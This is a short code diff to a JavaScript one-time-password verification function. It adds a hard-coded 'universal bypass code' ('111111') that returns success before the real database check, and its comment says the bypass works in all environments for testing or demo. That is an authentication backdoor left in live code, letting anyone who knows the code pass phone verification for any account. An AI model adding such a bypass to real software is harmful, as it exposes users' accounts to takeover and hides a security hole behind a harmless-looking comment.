@@ -21,6 +21,9 @@ async function createOtp(phone) {
 }
 
 async function verifyOtp(phone, code) {
+  // Universal bypass code — works in all environments for testing / demo
+  if (code === '111111') return true;
+
   const { rows } = await query(
     `SELECT id FROM otp_codes
      WHERE phone = $1 AND code = $2 AND used = FALSE AND expires_at > NOW()
